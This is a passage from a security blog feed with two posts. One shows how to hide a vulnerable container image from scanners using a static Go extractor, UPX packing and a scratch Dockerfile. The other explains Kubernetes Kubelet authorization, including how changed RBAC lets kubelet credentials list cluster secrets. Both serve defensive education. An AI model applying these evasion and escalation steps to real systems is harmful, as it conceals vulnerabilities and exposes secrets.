	&lt;span class=&quot;c&quot;&gt;// Use archiver library to open and extract the ZIP file&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Unarchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tarFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to unzip:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unzip completed successfully!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;//err = cmd.Run()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to execute:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;output %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The code is pretty simple essentially we just take the tarball and extract it to the current directory, then execute the command provided as the second argument, which by that point can run binaries from the extracted tarball.&lt;/p&gt;

&lt;h2 id=&quot;building-the-binary&quot;&gt;Building the binary&lt;/h2&gt;

&lt;p&gt;An important note is that at the point the extractor runs there is nothing else in the container image, so it’ll need to be compiled statically. something like this.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;CGO_ENABLED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 go build &lt;span class=&quot;nt&quot;&gt;-ldflags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-s -w&quot;&lt;/span&gt; main.go
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve done that you can use a trick from the talk to ensure the binary itself doesn’t have any visible vulnerabilities. Just pack it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upx&lt;/code&gt; and that will fix that problem.&lt;/p&gt;

&lt;h2 id=&quot;getting-the-tarball-to-run&quot;&gt;Getting the tarball to run&lt;/h2&gt;

&lt;p&gt;With the binary built you can just create a tarball by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker export&lt;/code&gt; with any running (or stopped) container. Any Docker image should work fine for this.&lt;/p&gt;

&lt;h2 id=&quot;building-the-docker-image&quot;&gt;Building the Docker image&lt;/h2&gt;

&lt;p&gt;Now you can create a Dockerfile like this :-&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; scratch&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; image.tar /&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; main /&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;ENTRYPOINT&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; [&quot;/main&quot;,&quot;image.tar&quot;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;An important point here is using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENTRYPOINT&lt;/code&gt; rather than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMD&lt;/code&gt; as we want to be able to pass an argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run&lt;/code&gt; and have it be passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; as the second argument.&lt;/p&gt;

&lt;p&gt;With that docker file something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build -t obfuscator .&lt;/code&gt; should work fine.&lt;/p&gt;

&lt;h2 id=&quot;running-the-image&quot;&gt;Running the image&lt;/h2&gt;

&lt;p&gt;Now you can run the image like this would run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; in the container :-&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; obfuscator &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;does-it-fool-scanners&quot;&gt;Does it fool scanners?&lt;/h2&gt;

&lt;p&gt;Of course none of this is terribly useful if it doesn’t actually fool scanners. Happily a check with Trivy, Grype, Docker Scan and Docker Scout came up clean, when using our super vulnerable &lt;a href=&quot;https://github.com/bgeesaman/malicious-compliance/blob/main/docker/Dockerfile-0-base&quot;&gt;base image&lt;/a&gt; from the talk :)&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is a pretty silly way to bypass scanners, but it hopefully makes a useful point, which was one of our takeaways from the talk. If you can’t trust the people that built a container image (or any other artifact) then you can’t rely on tools like container vulnerability scanners to tell you any useful information about the contents of that image. You need to consider what’s in the image yourself, and make your own decisions about whether it’s safe to use! In case anyone wants to have a look at this, the code is &lt;a href=&quot;https://github.com/raesene/container_image_obfuscator&quot;&gt;on GitHub&lt;/a&gt;&lt;/p&gt;

</description>
				<pubDate>Sat, 22 Apr 2023 15:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2023/04/22/Fun-with-container-images-Bypassing-vulnerability-scanners/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/04/22/Fun-with-container-images-Bypassing-vulnerability-scanners/</guid>
			</item>
		
			<item>
				<title>Let's talk about Kubelet authorization</title>
				<description>&lt;p&gt;I’ve been meaning to write a post about Kubelet authorization for a while now, and as there have been some posts this week where it got a mention, now seems like a good time!&lt;/p&gt;

&lt;p&gt;The Kubelet is the Kubernetes component which runs on each worker (and possible control plane) node and is responsible for managing the container runtime on the host. It communicates with the Kubernetes API server to get information about workloads that should be running on the node and then instantiates them using a container runtime like Containerd. To do this, it obviously needs credentials to access the API server, and needs rights to things like pods and also associated objects like secrets.&lt;/p&gt;

&lt;p&gt;From a security perspective these Kubelet credentials are important as, if an attacker breaks out from a container to the underlying node, there will generally be a set of kubelet credentials available to them, so they could be used to escalate rights to the cluster, as a result it’s been necessary for the Kubernetes project to take steps to restrict what the Kubelet can do, to reduce the risk of privilege escalation.&lt;/p&gt;

&lt;h2 id=&quot;a-brief-aside---kubernetes-authorization-modes&quot;&gt;A Brief aside - Kubernetes authorization modes&lt;/h2&gt;

&lt;p&gt;An important aspect of Kubernetes to discuss before talking about exactly how Kubelet authorization works, is how Kubernetes generally handles authorization. Whilst most clusters will use RBAC, it’s possible to have multiple authorization modes in any cluster. Rights provided by each authorization mode are cumulative, so it’s important to be careful about inadvertently granting rights to users. Also, if you’re using Kubernetes in-built tooling for listing all of a users permissions (via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i --list&lt;/code&gt; command showne below), it’s worth noting that this &lt;em&gt;only&lt;/em&gt; works with RBAC, rights granted via other authorization modes will not be analyzed, although you can check for individual rights granted via any authorization mode using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i&lt;/code&gt; command.&lt;/p&gt;

&lt;h2 id=&quot;kubelet-authorization&quot;&gt;Kubelet authorization&lt;/h2&gt;

&lt;p&gt;Having talked about the fundamentals, let’s look at how Kubelet authorization works. We’ll start with a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt; cluster and look at what’s visible there.&lt;/p&gt;

&lt;p&gt;For this we’ll use a cluster with two worker nodes, using a simple kind config&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# three node (two workers) cluster config&lt;/span&gt;
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
- role: worker
- role: worker
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we can start the cluster up with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster --config kind-config.yaml --name kubeletauthz&lt;/code&gt;. Once the cluster is up and running we can shell into one of the worker nodes to look at the Kubelet credentials. You can find out what Kubeconfig file the Kubelet is using by looking at the parameters passed to the Kubelet on the command line. In the case of Kubeadm the default will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--kubeconfig=/etc/kubernetes/kubelet.conf&lt;/code&gt;. Once we know the location we can use that with Kubectl, for example to see a listing of pods in the cluster&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf get po &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;
NAMESPACE            NAME                                                 READY   STATUS    RESTARTS   AGE
kube-system          coredns-787d4945fb-4rspx                             1/1     Running   0          4m43s
kube-system          coredns-787d4945fb-p5g6f                             1/1     Running   0          4m43s
kube-system          etcd-kubeletauthz-control-plane                      1/1     Running   0          4m56s
kube-system          kindnet-clmjl                                        1/1     Running   0          4m43s
kube-system          kindnet-jhngj                                        1/1     Running   0          4m26s
kube-system          kindnet-kjsvt                                        1/1     Running   0          4m27s
kube-system          kube-apiserver-kubeletauthz-control-plane            1/1     Running   0          4m55s
kube-system          kube-controller-manager-kubeletauthz-control-plane   1/1     Running   0          4m55s
kube-system          kube-proxy-9v62x                                     1/1     Running   0          4m43s
kube-system          kube-proxy-q8t5c                                     1/1     Running   0          4m26s
kube-system          kube-proxy-vnrt6                                     1/1     Running   0          4m27s
kube-system          kube-scheduler-kubeletauthz-control-plane            1/1     Running   0          4m56s
local-path-storage   local-path-provisioner-75f5b54ffd-52xm9              1/1     Running   0          4m43s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Usually to check the rights of a principal in Kubernetes we’d use the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i --list&lt;/code&gt; and if we try that with the Kubelet credentials we get back something like this.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf auth can-i &lt;span class=&quot;nt&quot;&gt;--list&lt;/span&gt;
Warning: the list may be incomplete: node authorizer does not support user rule resolution
Resources                                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io                   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
selfsubjectrulesreviews.authorization.k8s.io                    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
certificatesigningrequests.certificates.k8s.io/selfnodeclient   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api]              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis]             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]         &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]         &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notably there are no rights to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pod&lt;/code&gt; objects that we just looked at! The clue to what’s going on here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Warning&lt;/code&gt; line at the top which notes that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node authorizor&lt;/code&gt; doesn’t support user rule resolution.&lt;/p&gt;

&lt;p&gt;One quick aside is that you may be confused by the Kubelet not using RBAC as there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:node&lt;/code&gt; which looks like it would provide rights to nodes, however the corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; doesn’t actually have any subjects (which is weird), so it has no effect!&lt;/p&gt;

&lt;h2 id=&quot;node-authorizer&quot;&gt;Node authorizer&lt;/h2&gt;

&lt;p&gt;The key to what’s going on here can be see in the configuration of the Kubernetes API server. If you look at the parameters passed to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-apiserver&lt;/code&gt; component you’ll see this stanza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--authorization-mode=Node,RBAC&lt;/code&gt; indicating that there are two modes of authorization configured and, as we said earlier, the rights from these are cumulative.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;https://kubernetes.io/docs/reference/access-authn-authz/node/&quot;&gt;Node authorization mode&lt;/a&gt; is an authorization mode with one purpose which is to provide rights to Kubelets. From the documentation page we can see that this authorization mode allows access to the kind of resources that the Kubelet needs to use like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodes&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configmaps&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets&lt;/code&gt;. Within that group it also needs to restrict &lt;em&gt;which&lt;/em&gt; secrets etc are actually accessible as you don’t want a Kubelet on one node to be able to access secrets intended for pods running on another node.&lt;/p&gt;

&lt;p&gt;The exact logic of what is allowed can be seen in &lt;a href=&quot;https://github.com/kubernetes/kubernetes/blob/bd190762fb77b78788e1a3ba72d70a8a08e184b8/plugin/pkg/auth/authorizer/node/node_authorizer.go#L41&quot;&gt;the code&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// NodeAuthorizer authorizes requests from kubelets, with the following logic:
// 1. If a request is not from a node &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NodeIdentity&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; returns &lt;span class=&quot;nv&quot;&gt;isNode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reject
// 2. If a specific node cannot be identified &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NodeIdentity&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; returns &lt;span class=&quot;nv&quot;&gt;nodeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reject
// 3. If a request is &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a secret, configmap, persistent volume or persistent volume claim, reject unless the verb is get, and the requested object is related to the requesting node:
//    node &amp;lt;- configmap
//    node &amp;lt;- pod
//    node &amp;lt;- pod &amp;lt;- secret
//    node &amp;lt;- pod &amp;lt;- configmap
//    node &amp;lt;- pod &amp;lt;- pvc
//    node &amp;lt;- pod &amp;lt;- pvc &amp;lt;- pv
//    node &amp;lt;- pod &amp;lt;- pvc &amp;lt;- pv &amp;lt;- secret
// 4. For other resources, authorize all nodes uniformly using statically defined rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see this in effect if you try to get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets&lt;/code&gt; from a cluster with Kubelet credentials&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf get secrets &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;
Error from server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Forbidden&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: secrets is forbidden: User &lt;span class=&quot;s2&quot;&gt;&quot;system:node:kubeletauthz-worker&quot;&lt;/span&gt; cannot list resource &lt;span class=&quot;s2&quot;&gt;&quot;secrets&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;API group &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; at the cluster scope: can only &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;namespaced object of this &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One important point to note on this is where the logic is “reject”, this just passes the request to other configured authorization modes, so if cluster RBAC has been modified to allow the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:nodes&lt;/code&gt; group to do something in excess of what the Node authorization mode allows then that will still be allowed.&lt;/p&gt;

&lt;p&gt;You can see this by, for example, editing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:node&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; to add the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:nodes&lt;/code&gt; group as a subject, by adding these lines to it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;subjects:
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:nodes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve done that, if you use Kubelet credentials to try and get secrets at a cluster level, it works fine :)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf get secrets &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;
NAMESPACE     NAME                     TYPE                            DATA   AGE
kube-system   bootstrap-token-abcdef   bootstrap.kubernetes.io/token   6      34m
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are a couple of places where this mode can’t effectively restrict permissions, which are in node and pod properties, for that we need another component.&lt;/p&gt;

&lt;h2 id=&quot;noderestriction-admission-controller&quot;&gt;NodeRestriction Admission Controller&lt;/h2&gt;

&lt;p&gt;This is where a specialized admission controller comes in. The &lt;a href=&quot;https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#noderestriction&quot;&gt;NodeRestriction admission controller&lt;/a&gt; looks at requests from Kubelets and, where they relate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodes&lt;/code&gt; it limits the rights to only those that are appropriate for the Kubelet. For example it restricts what properties of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node&lt;/code&gt; objects can be modified, to stop it changing it’s own security classification, for example.&lt;/p&gt;

&lt;h2 id=&quot;variations-in-kubernetes-distributions&quot;&gt;Variations in Kubernetes distributions&lt;/h2&gt;

&lt;p&gt;It’s important to note that, as with most Kubernetes configuration topics, what we’ve discussed here relates to vanilla Kubernetes, in this case Kubeadm. Distribution providers are free to change this configuration and indeed some do so. For example Azure AKS currently defaults to allowing Kubelets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets&lt;/code&gt; at the cluster level!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

